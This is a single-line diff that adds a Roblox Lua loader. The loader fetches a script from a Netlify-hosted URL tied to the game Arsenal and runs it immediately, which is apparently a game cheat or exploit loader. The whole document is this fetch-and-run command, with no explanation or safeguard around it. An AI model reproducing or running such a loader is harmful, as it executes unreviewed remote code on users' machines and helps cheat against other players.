@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://telchid.netlify.app/game/arsenal/source.lua"))()
